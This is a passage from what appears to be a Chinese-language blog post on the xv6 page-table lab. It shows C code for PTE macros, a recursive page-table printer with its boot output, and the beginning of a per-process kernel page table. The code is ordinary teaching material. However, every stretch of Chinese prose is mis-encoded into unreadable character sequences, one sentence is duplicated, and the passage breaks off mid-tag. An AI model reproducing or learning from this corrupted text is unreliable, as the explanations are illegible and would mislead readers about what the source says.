tableé‡Œé¢ï¼Œå¦‚æœä¸€ä¸ªPTEä¸ºç©ºï¼Œé‚£ä¹ˆä½ å°±å®Œå…¨ä¸ç”¨åˆ›å»ºå®ƒå¯¹åº”çš„ä¸­é—´çº§å’Œæœ€åº•å±‚page tableï¼Œä»¥åŠé‡Œé¢çš„PTEã€‚æ‰€ä»¥ï¼Œè¿™å°±æ˜¯åƒæ˜¯åœ¨æ•´ä¸ªè™šæ‹Ÿåœ°å€ç©ºé—´ä¸­çš„ä¸€å¤§æ®µåœ°å€å®Œå…¨ä¸éœ€è¦æœ‰æ˜ å°„ä¸€æ ·ã€‚</p><p>3çº§page tableå°±åƒæ˜¯æŒ‰éœ€åˆ†é…è¿™äº›æ˜ å°„å—3çº§page tableå°±åƒæ˜¯æŒ‰éœ€åˆ†é…è¿™äº›æ˜ å°„å—</p></blockquote><p>å¯¹äºé¡µè¡¨çš„æ¯ä¸€é¡¹çš„å†…å®¹ï¼Œ<code>0~63</code>ä½å¦‚ä¸‹</p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202304171551739.png"></p><p>xv6ä¸­å®šä¹‰çš„ä¸€äº›å®å¦‚ä¸‹ï¼Œå’Œpteä½œ<code>ä¸</code>è¿ç®—ä¹‹åå¯ä»¥å¾—åˆ°é¡µè¡¨çš„æŸä¸€ä½ï¼Œæ¯”å¦‚pte &amp; PTE_Vå¯ä»¥å¾—çŸ¥é¡µè¡¨æ˜¯å¦æœ‰æ•ˆ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PTE_V (1L &lt;&lt; 0) <span class="hljs-comment">// valid 00001</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PTE_R (1L &lt;&lt; 1) <span class="hljs-comment">// readable 00010</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PTE_W (1L &lt;&lt; 2) <span class="hljs-comment">// writeable00100</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PTE_X (1L &lt;&lt; 3) <span class="hljs-comment">// executable01000</span></span><br></code></pre></td></tr></table></figure><p>PA2PTE(pa)å°†è™šæ‹Ÿåœ°å€å³ç§»æˆªæ–­12ä½ä¹‹åå†å·¦ç§»10ä½ï¼Œå¯ä»¥å¾—åˆ°å¯¹åº”çš„é¡µè¡¨é¡¹</p><p>PTE2PA(pte)å°†é¡µè¡¨é¡¹å³ç§»æˆªæ–­10ä½ä¹‹åå†å·¦ç§»12ä½ï¼Œå¯ä»¥å¾—åˆ°å¯¹åº”çš„è™šæ‹Ÿåœ°å€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PA2PTE(pa) ((((uint64)pa) &gt;&gt; 12) &lt;&lt; 10)</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PTE2PA(pte) (((pte) &gt;&gt; 10) &lt;&lt; 12)</span><br></code></pre></td></tr></table></figure><h2 id="Print-a-page-table"><a href="#Print-a-page-table" class="headerlink" title="Print a page table"></a>Print a page table</h2><p>åœ¨sh.cä¸­åŠ å…¥ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Execute cmd.  Never returns.*</span><br>__attribute__((noreturn)) <br><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">runcmd</span><span class="hljs-params">(struct cmd *cmd)</span> </span>&#123;<br>.....<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ ·åšæ˜¯ä¸ºäº†é˜²æ­¢æŠ¥é€’å½’é”™</p><p>åœ¨exec.cä¸­åŠ å…¥ä¸‹é¢ä»£ç ï¼Œä»¥æ‰“å°å‡ºè¿›ç¨‹1çš„é¡µè¡¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(p-&gt;pid==<span class="hljs-number">1</span>) <br>  vmprint(p-&gt;pagetable);<br><br><span class="hljs-keyword">return</span> argc; <span class="hljs-comment">// this ends up in a0, the first argument to main(argc, argv)</span><br><br></code></pre></td></tr></table></figure><p>åœ¨ kernel/defs.h ä¸­å®šä¹‰ vmprint çš„åŸå‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// vm.c</span><br><span class="hljs-function"><span class="hljs-keyword">void</span>            <span class="hljs-title">vmprint</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span>            <span class="hljs-title">dfs_vmprint</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span> ,<span class="hljs-keyword">int</span> )</span></span>;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬éœ€è¦åœ¨vm.cä¸­ç¼–å†™vmprintå‡½æ•°çš„ä»£ç </p><p>å…ˆè§‚å¯Ÿä¸€ä¸‹ç»™å‡ºçš„è¾“å‡º</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">page table 0x0000000087f6e000<br><span class="hljs-string">..0</span>: pte 0x0000000021fda801 pa 0x0000000087f6a000<br><span class="hljs-string">..</span> <span class="hljs-string">..0</span>: pte 0x0000000021fda401 pa 0x0000000087f69000<br><span class="hljs-string">..</span> <span class="hljs-string">..</span> <span class="hljs-string">..0</span>: pte 0x0000000021fdac1f pa 0x0000000087f6b000<br><span class="hljs-string">..</span> <span class="hljs-string">..</span> <span class="hljs-string">..1</span>: pte 0x0000000021fda00f pa 0x0000000087f68000<br><span class="hljs-string">..</span> <span class="hljs-string">..</span> <span class="hljs-string">..2</span>: pte 0x0000000021fd9c1f pa 0x0000000087f67000<br><span class="hljs-string">..255</span>: pte 0x0000000021fdb401 pa 0x0000000087f6d000<br><span class="hljs-string">..</span> <span class="hljs-string">..511</span>: pte 0x0000000021fdb001 pa 0x0000000087f6c000<br><span class="hljs-string">..</span> <span class="hljs-string">..</span> <span class="hljs-string">..510</span>: pte 0x0000000021fdd807 pa 0x0000000087f76000<br><span class="hljs-string">..</span> <span class="hljs-string">..</span> <span class="hljs-string">..511</span>: pte 0x0000000020001c0b pa 0x0000000080007000<br></code></pre></td></tr></table></figure><p>å¯¹è¯¥è¾“å‡ºæ ¼å¼çš„å‡ ç‚¹è§£é‡Šï¼š</p><ul><li>ç¬¬ä¸€è¡Œæ ¼å¼æ˜¯<code>page table %p</code>ï¼Œ%pæ˜¯ä¸€çº§é¡µè¡¨å…¥å£çš„åœ°å€ï¼Œpagetable[i]å°±æ˜¯ä¸€çº§é¡µè¡¨ç¬¬ié¡¹</li><li>ç¬¬äºŒè¡Œå¼€å§‹ï¼Œæ˜¯dfsçš„ç»“æœã€‚ä»0åˆ°512è¿›è¡Œå¾ªç¯ï¼Œçœ‹pteæ˜¯å¦æœ‰æ•ˆï¼Œå¦‚æœæœ‰æ•ˆé‚£ä¹ˆæ‰¾åˆ°pteæŒ‡å‘çš„ä¸‹ä¸€ä¸ªæ¡ç›®ï¼Œç›´åˆ°æ‰¾åˆ°å¶å­èŠ‚ç‚¹</li><li>é¡¶çº§é¡µè¡¨é¡µé¢åªæœ‰æ¡ç›®0å’Œ255çš„æ˜ å°„ã€‚æ¡ç›®0çš„ä¸‹ä¸€ä¸ªçº§åˆ«çš„é¡µè¡¨åªæ˜ å°„äº†ç´¢å¼•0ï¼Œè€Œè¯¥ç´¢å¼•0çš„åº•å±‚åˆ™æ˜ å°„äº†æ¡ç›®0ã€1å’Œ2ã€‚é¡¶çº§é¡µè¡¨255åŒç†</li></ul><p>å…ˆå†™å‡ºvmprintå‡½æ•°ï¼ŒæŠŠç¬¬ä¸€è¡Œæ‰“å°å‡ºæ¥ï¼Œç„¶åè¿›å…¥dfså¾ªç¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> </span><br><span class="hljs-function"><span class="hljs-title">vmprint</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span> pagetable)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;page table %p\n&quot;</span>, pagetable);<br>  dfs_vmprint(pagetable, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>pte &amp; PTE_V</code>ç”¨æ¥åˆ¤æ–­é¡µè¡¨æ˜¯å¦æœ‰æ•ˆï¼Œå¦‚æœæœ‰æ•ˆå°±å…ˆå°†å¯¹åº”çš„æ‰€æœ‰ä¿¡æ¯æ‰“å°å‡ºæ¥</p><p><code>pte &amp; (PTE_R|PTE_W|PTE_X)) == 0</code>ç”¨æ¥åˆ¤æ–­æ˜¯å¦æœ‰ä¸‹ä¸€çº§çš„é¡µè¡¨ï¼Œå¦‚æœæœ‰çš„è¯ï¼Œå°±å°†è¯¥pteè½¬åŒ–ä¸ºè™šæ‹Ÿåœ°å€ï¼Œè¿›å…¥é€’å½’</p><p>å†™è¿™éƒ¨åˆ†ä»£ç è¦ä»”ç»†å‚è€ƒé˜…è¯»æºç ä¸­çš„freewalkå‡½æ•°ï¼Œå¾ˆæœ‰å¸®åŠ©</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">dfs_vmprint</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span> pagetable,<span class="hljs-keyword">int</span> level)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// there are 2^9 = 512 PTEs in a page table.</span><br>  <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">512</span>; i++)&#123;<br>    <span class="hljs-keyword">pte_t</span> pte = pagetable[i];<br>    <span class="hljs-keyword">if</span>((pte &amp; PTE_V))&#123;<span class="hljs-comment">//åªè¦æœ‰æ•ˆå°±æ‰“å°å‡ºæ¥</span><br>      <span class="hljs-comment">// this PTE points to a lower-level page table.</span><br>      <br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;..&quot;</span>);<span class="hljs-comment">//è¾“å‡º..çš„æ ¼å¼æ§åˆ¶</span><br>      <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">0</span>;j&lt;level;j++) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; ..&quot;</span>);<br>      <br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d: pte %p pa %p\n&quot;</span>, i, pte, PTE2PA(pte));<span class="hljs-comment">//è¾“å‡ºé¡µè¡¨é¡¹ä¿¡æ¯</span><br>    <br>      <span class="hljs-keyword">if</span>((pte &amp; (PTE_R|PTE_W|PTE_X)) == <span class="hljs-number">0</span>)<span class="hljs-comment">//å¦‚æœæœ‰ä¸‹ä¸€çº§çš„é¡µè¡¨</span><br>      &#123;<br>        uint64 child = PTE2PA(pte);<br>        dfs_vmprint((<span class="hljs-keyword">pagetable_t</span>)child, level+<span class="hljs-number">1</span>);<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> make qemu</span><br>qemu-system-riscv64 -machine virt -bios none -kernel kernel/kernel -m 128M -smp 3 -nographic -drive file=fs.img,if=none,format=raw,id=x0 -device virtio-blk-device,drive=x0,bus=virtio-mmio-bus.0<br><br>xv6 kernel is booting<br><br>hart 2 starting<br>hart 1 starting<br>page table 0x0000000087f6e000<br>..0: pte 0x0000000021fda801 pa 0x0000000087f6a000<br>.. ..0: pte 0x0000000021fda401 pa 0x0000000087f69000<br>.. .. ..0: pte 0x0000000021fdac1f pa 0x0000000087f6b000<br>.. .. ..1: pte 0x0000000021fda00f pa 0x0000000087f68000<br>.. .. ..2: pte 0x0000000021fd9c1f pa 0x0000000087f67000<br>..255: pte 0x0000000021fdb401 pa 0x0000000087f6d000<br>.. ..511: pte 0x0000000021fdb001 pa 0x0000000087f6c000<br>.. .. ..510: pte 0x0000000021fdd807 pa 0x0000000087f76000<br>.. .. ..511: pte 0x0000000020001c0b pa 0x0000000080007000<br>init: starting sh<br><span class="hljs-meta">$</span><span class="bash"> </span><br></code></pre></td></tr></table></figure><h2 id="A-kernel-page-table-per-process"><a href="#A-kernel-page-table-per-process" class="headerlink" title="A kernel page table per process"></a>A kernel page table per process</h2><p>Xv6åªæœ‰ä¸€ä¸ªå†…æ ¸é¡µè¡¨ï¼Œåªè¦åœ¨å†…æ ¸ä¸­æ‰§è¡Œï¼Œå°±ä¼šä½¿ç”¨å®ƒã€‚å†…æ ¸é¡µè¡¨æ˜¯ç‰©ç†åœ°å€çš„ç›´æ¥æ˜ å°„ï¼Œä¹Ÿå³æ˜¯å†…æ ¸è™šæ‹Ÿåœ°å€ x æ˜ å°„åˆ°ç‰©ç†åœ°å€ xã€‚æ¯ä¸ªè¿›ç¨‹ä¹Ÿä¼šæœ‰è‡ªå·±çš„ç”¨æˆ·é¡µè¡¨ï¼Œè¯¥é¡µè¡¨åªåŒ…å«æ­¤è¿›ç¨‹çš„ç”¨æˆ·ç©ºé—´çš„åœ°å€æ˜ å°„ã€‚è€Œè¿™äº›ç”¨æˆ·é¡µè¡¨å’Œç”¨æˆ·åœ°å€åœ¨å†…æ ¸é¡µè¡¨ä¸­æ˜¯ä¸å­˜åœ¨çš„ã€‚å› æ­¤å°±ä¼šå‡ºç°ä¸€ä¸ªé—®é¢˜ï¼šå‡è®¾ç”¨æˆ·è¿›ç¨‹è°ƒç”¨writeç³»ç»Ÿè°ƒç”¨å¹¶ä¼ é€’ä¸€ä¸ªæŒ‡é’ˆï¼Œç”±äºè¯¥æŒ‡é’ˆæ˜¯ç”¨æˆ·çº§çš„åœ°å€ï¼Œåœ¨å†…æ ¸ä¸­æ˜¯æ— æ•ˆçš„ï¼Œå› æ­¤å®é™…è¿‡ç¨‹ä¸­ä¼šå…ˆå°†ç”¨æˆ·çº§çš„è™šæ‹Ÿåœ°å€è½¬æ¢ä¸ºç‰©ç†åœ°å€ï¼Œè¿™æ ·å°±ä¼šé€ æˆä¸€å®šç¨‹åº¦çš„å¼€é”€ã€‚æœ¬ä»»åŠ¡å°±æ˜¯ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œè®©æ¯ä¸ªç”¨æˆ·çº§çš„è¿›ç¨‹éƒ½æœ‰ä¸€ä¸ªå†…æ ¸é¡µè¡¨</p><p><strong>ä»»åŠ¡ï¼šä¿®æ”¹å†…æ ¸ï¼Œä»¥ä¾¿æ¯ä¸ªè¿›ç¨‹åœ¨å†…æ ¸ä¸­æ‰§è¡Œæ—¶ä½¿ç”¨å…¶è‡ªå·±çš„å†…æ ¸é¡µè¡¨å‰¯æœ¬</strong></p><p>æˆ‘ä»¬è‡ªç„¶æƒ³åˆ°è¦åœ¨ <code>struct proc</code>ä¸­åŠ ä¸Šè¿›ç¨‹çš„å†…æ ¸é¡µè¡¨æ¡ç›® kpgtable</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Per-process state</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> &#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spinlock</span> <span class="hljs-title">lock</span>;</span><br><br>  <span class="hljs-comment">// p-&gt;lock must be held when using these:</span><br>  <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">procstate</span> <span class="hljs-title">state</span>;</span>        <span class="hljs-comment">// Process state</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">parent</span>;</span>         <span class="hljs-comment">// Parent process</span><br>  <span class="hljs-keyword">void</span> *chan;                  <span class="hljs-comment">// If non-zero, sleeping on chan</span><br>  <span class="hljs-keyword">int</span> killed;                  <span class="hljs-comment">// If non-zero, have been killed</span><br>  <span class="hljs-keyword">int</span> xstate;                  <span class="hljs-comment">// Exit status to be returned to parent&#x27;s wait</span><br>  <span class="hljs-keyword">int</span> pid;                     <span class="hljs-comment">// Process ID</span><br><br>  <span class="hljs-comment">// these are private to the process, so p-&gt;lock need not be held.</span><br>  uint64 kstack;               <span class="hljs-comment">// Virtual address of kernel stack</span><br>  uint64 sz;                   <span class="hljs-comment">// Size of process memory (bytes)</span><br>  <span class="hljs-keyword">pagetable_t</span> pagetable;       <span class="hljs-comment">// User page table</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> *<span class="hljs-title">trapframe</span>;</span> <span class="hljs-comment">// data page for trampoline.S</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">context</span> <span class="hljs-title">context</span>;</span>      <span class="hljs-comment">// swtch() here to run process</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">ofile</span>[<span class="hljs-title">NOFILE</span>];</span>  <span class="hljs-comment">// Open files</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">cwd</span>;</span>           <span class="hljs-comment">// Current directory</span><br>  <span class="hljs-keyword">char</span> name[<span class="hljs-number">16</span>];               <span class="hljs-comment">// Process name (debugging)</span><br>  <span class="hljs-keyword">pagetable_t</span> kpgtable;        <span class="hljs-comment">// Kernel page table</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>åé¢è¦ç”¨çš„å‡ ä¸ªé‡è¦å‡½æ•°</p><table><thead><tr><th>å‡½æ•°åç§°</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>walk</td><td>é€šè¿‡è™šæ‹Ÿåœ°å€å¾—åˆ° PTE</td></tr><tr><td>mappages</td><td>å°†è™šæ‹Ÿåœ°å€æ˜ å°„åˆ°ç‰©ç†åœ°å€</td></tr><tr><td>copyin</td><td>å°†ç”¨æˆ·è™šæ‹Ÿåœ°å€çš„æ•°æ®å¤åˆ¶åˆ°å†…æ ¸ç©ºé—´åœ°å€</td></tr><tr><td>copyout</td><td>å°†å†…æ ¸æ•°æ®å¤åˆ¶åˆ°ç”¨æˆ·è™šæ‹Ÿåœ°å€</td></tr><tr><td>kvminit</td><td>åˆ›å»ºå†…æ ¸çš„é¡µè¡¨ï¼Œå¯¹å…¨å±€çš„<code>kernel_pagetable</code>è¿›è¡Œæ˜ å°„</td></tr><tr><td>kvmmap</td><td>è°ƒç”¨ mappagesï¼Œå°†ä¸€ä¸ªè™šæ‹Ÿåœ°å€èŒƒå›´æ˜ å°„åˆ°ä¸€ä¸ªç‰©ç†åœ°å€èŒƒå›´</td></tr><tr><td>kvminithart</td><td>æ˜ å°„å†…æ ¸é¡µè¡¨ã€‚å®ƒå°†æ ¹é¡µè¡¨é¡µçš„ç‰©ç†åœ°å€å†™å…¥å¯„å­˜å™¨ satp ä¸­</td></tr><tr><td>procinit</td><td>ä¸ºæ¯ä¸ªè¿›ç¨‹åˆ†é…ä¸€ä¸ªå†…æ ¸æ ˆ</td></tr><tr><td>kalloc</td><td>åˆ†é…ç‰©ç†é¡µ</td></tr><tr><td>proc_pagetable(struct proc *<em>p</em>)</td><td>ä¸ºç»™å®šçš„è¿›ç¨‹åˆ›å»ºç”¨æˆ·æ€é¡µè¡¨</td></tr><tr><td>kvminithart</td><td>æ˜ å°„å†…æ ¸é¡µè¡¨ã€‚å®ƒå°†æ ¹é¡µè¡¨é¡µçš„ç‰©ç†åœ°å€å†™å…¥å¯„å­˜å™¨ satp ä¸­</td></tr></tbody></table><p>ç›¸å…³å‡½æ•°è°ƒç”¨é“¾ï¼š</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xl">main <br><span class="hljs-function"><span class="hljs-title">kvminit</span> -&gt;</span> kvmmap<br>procinit<br><span class="hljs-function"><span class="hljs-title">userinit</span> -&gt;</span> allocproc<br></code></pre></td></tr></table></figure><p>ä¹‹åï¼Œæˆ‘ä»¬è¦å¯¹è¿›ç¨‹çš„å†…æ ¸é¡µè¡¨è¿›è¡Œåˆå§‹åŒ–</p><p>å‚è€ƒkvminitå‡½æ•°å’Œkvmmapå‡½æ•°ï¼Œè¿™ä¸¤ä¸ªå‡½æ•°ç”¨æ¥æ·»åŠ å¯¹å…¨å±€kernel_pagetableçš„æ˜ å°„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * create a direct-map page table for the kernel.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">kvminit</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  kernel_pagetable = (<span class="hljs-keyword">pagetable_t</span>) kalloc();<br>  <span class="hljs-built_in">memset</span>(kernel_pagetable, <span class="hljs-number">0</span>, PGSIZE);<br><br>  <span class="hljs-comment">// uart registers</span><br>  kvmmap(UART0, UART0, PGSIZE, PTE_R | PTE_W);<br><br>  <span class="hljs-comment">// virtio mmio disk interface</span><br>  kvmmap(VIRTIO0, VIRTIO0, PGSIZE, PTE_R | PTE_W);<br><br>  <span class="hljs-comment">// CLINT</span><br>  kvmmap(CLINT, CLINT, <span class="hljs-number">0x10000</span>, PTE_R | PTE_W);<br><br>  <span class="hljs-comment">// PLIC</span><br>  kvmmap(PLIC, PLIC, <span class="hljs-number">0x400000</span>, PTE_R | PTE_W);<br><br>  <span class="hljs-comment">// map kernel text executable and read-only.</span><br>  kvmmap(KERNBASE, KERNBASE, (uint64)etext-KERNBASE, PTE_R | PTE_X);<br><br>  <span class="hljs-comment">// map kernel data and the physical RAM we&#x27;ll make use of.</span><br>  kvmmap((uint64)etext, (uint64)etext, PHYSTOP-(uint64)etext, PTE_R | PTE_W);<br><br>  <span class="hljs-comment">// map the trampoline for trap entry/exit to</span><br>  <span class="hljs-comment">// the highest virtual address in the kernel.</span><br>  kvmmap(TRAMPOLINE, (uint64)trampoline, PGSIZE, PTE_R | PTE_X);<br>&#125;<br><br><span class="hljs-comment">// add a mapping to the kernel page table.</span><br><span class="hljs-comment">// only used when booting.</span><br><span class="hljs-comment">// does not flush TLB or enable paging.</span><br><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">kvmmap</span><span class="hljs-params">(uint64 va, uint64 pa, uint64 sz, <span class="hljs-keyword">int</span> perm)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">if</span>(mappages(kernel_pagetable, va, sz, pa, perm) != <span class="hljs-number">0</span>)<br>    panic(<span class="hljs-string">&quot;kvmmap&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>ç±»ä¼¼çš„ï¼Œæˆ‘ä»¬åˆ›å»ºukvmmapå’Œukvminitè¿™ä¸¤ä¸ªå‡½æ•°ï¼Œå®Œæˆå¯¹è¿›ç¨‹ç»“æ„ä½“ä¸­çš„å†…æ ¸é¡µè¡¨çš„æ˜ å°„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">ukvmmap</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span> kpgtable,uint64 va, uint64 pa, uint64 sz, <span class="hljs-keyword">int</span> perm)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">if</span>(mappages(kpgtable, va, sz, pa, perm) != <span class="hljs-number">0</span>)<br>    panic(<span class="hljs-string">&quot;ukvmmap&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">pagetable_t</span></span><br><span class="hljs-function"><span class="hljs-title">ukvminit</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">pagetable_t</span> kpgtable=(<span class="hljs-keyword">pagetable_t</span>) kalloc();<br>  <span class="hljs-built_in">memset</span>(kpgtable, <span class="hljs-number">0</span>, PGSIZE);<br>  ukvmmap(kpgtable, UART0, UART0, PGSIZE, PTE_R | PTE_W);<br>  ukvmmap(kpgtable, VIRTIO0, VIRTIO0, PGSIZE, PTE_R | PTE_W);<br>  ukvmmap(kpgtable, CLINT, CLINT, <span class="hljs-number">0x10000</span>, PTE_R | PTE_W);<br>  ukvmmap(kpgtable, PLIC, PLIC, <span class="hljs-number">0x400000</span>, PTE_R | PTE_W);<br>  ukvmmap(kpgtable, KERNBASE, KERNBASE, (uint64)etext-KERNBASE, PTE_R | PTE_X);<br>  ukvmmap(kpgtable, (uint64)etext, (uint64)etext, PHYSTOP-(uint64)etext, PTE_R | PTE_W);<br>  ukvmmap(kpgtable, TRAMPOLINE, (uint64)trampoline, PGSIZE, PTE_R | PTE_X);<br>  <span class="hljs-keyword">return</span> kpgtable;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨defs.hä¸­éœ€è¦æ·»åŠ </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span>            <span class="hljs-title">ukvmmap</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span> ,uint64 , uint64 , uint64 , <span class="hljs-keyword">int</span> )</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">pagetable_t</span>     <span class="hljs-title">ukvminit</span><span 